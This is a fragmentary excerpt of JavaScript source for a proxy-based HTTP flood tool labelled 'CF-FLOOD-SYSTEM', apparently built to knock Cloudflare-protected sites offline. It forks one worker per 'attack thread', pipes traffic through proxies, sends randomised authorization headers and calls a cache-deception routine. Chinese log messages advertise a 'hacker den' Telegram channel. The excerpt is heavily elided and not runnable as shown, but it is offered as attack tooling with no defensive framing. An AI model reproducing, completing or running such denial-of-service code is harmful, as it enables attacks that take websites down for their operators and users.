...
`);
  ...
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [CF-FLOOD-SYSTEM]  攻击线程 ${i} 已经开始黑客小窝https://t.me/qingmengddks`);
  }
...
const uap = [
 ...
 if (cluster.isMaster) {
    ...
    setTimeout(() => perfect404CacheDeception(), 2000);
}
 ...
 class NetSocket {
  ...
  HTTP(options, callback) {
     ...
     connection.on("data", chunk => {
         ...
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "错误: 来自代理服务器的无效响应黑客小窝t.me/IIEyesX");
         }
     ...
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "错误: 超时黑客小窝t.me/IIEyesX");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "错误黑客小窝t.me/IIEyesX " + error);
     });
 }
}
...
headers["authorization"] = `Bearer ${randomString(64)}`;
